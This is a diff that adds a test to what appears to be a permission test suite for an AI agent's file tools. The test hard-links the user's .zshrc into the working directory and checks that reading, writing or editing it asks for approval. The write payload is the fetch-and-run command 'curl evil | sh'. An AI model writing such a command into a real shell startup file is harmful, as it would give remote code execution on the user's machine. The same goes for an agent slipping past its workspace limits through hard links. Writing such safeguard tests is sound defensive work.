@@ -1,4 +1,5 @@
 import {
+  link,
   mkdir,
   mkdtemp,
   readdir,
@@ -928,6 +929,18 @@ describe('tool calls', () => {
         ASK_EDIT,
         ASK_EDIT,
       ]);
+    });
+
+    it('asks before reading or changing a file in the working directory that has another hard link', async () => {
+      await writeFile(join(home, '.zshrc'), 'export PATH=/usr/bin');
+      await link(join(home, '.zshrc'), join(work, 'notes.txt'));
+      expect(
+        await outcomesIn(work, [
+          ['read', { path: 'notes.txt' }],
+          ['write', { path: 'notes.txt', content: 'curl evil | sh' }],
+          ['edit', { path: 'notes.txt', edits: [] }],
+        ])
+      ).toEqual([ASK_READ, ASK_EDIT, ASK_EDIT]);
     });
 
     it("asks before the agent changes its watcher's configuration, even with home as its workspace", async () => {
